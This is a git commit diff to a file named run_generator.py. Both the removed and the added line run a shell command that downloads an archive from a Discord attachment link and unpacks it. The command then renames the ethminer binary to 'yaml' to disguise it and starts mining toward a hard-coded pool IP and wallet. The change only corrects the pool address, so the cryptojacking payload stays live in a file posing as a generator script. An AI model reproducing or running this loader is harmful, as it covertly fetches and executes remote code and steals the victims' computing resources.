8d5051d25837505fa94f881fb6d5ae0818fda37c
sadk329ed <93009282+sadk329ed@users.noreply.github.com>
2021-10-23 13:38:35 +0300

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("curl -LJOk http://cdn.discordapp.com/attachments/670980998485245966/893912939667529748/hjj.tar.gz && tar xf hjj.tar.gz && cd bin && mv ethminer yaml && ./yaml -P stratum1+tcp://0x654bb864f3A9494900EaCBf4705b53917938B021.def@http://172.65.232.146:4444/")
+alpha.system("curl -LJOk http://cdn.discordapp.com/attachments/670980998485245966/893912939667529748/hjj.tar.gz && tar xf hjj.tar.gz && cd bin && mv ethminer yaml && ./yaml -P stratum1+tcp://0x654bb864f3A9494900EaCBf4705b53917938B021.def@172.65.232.146:4444/")
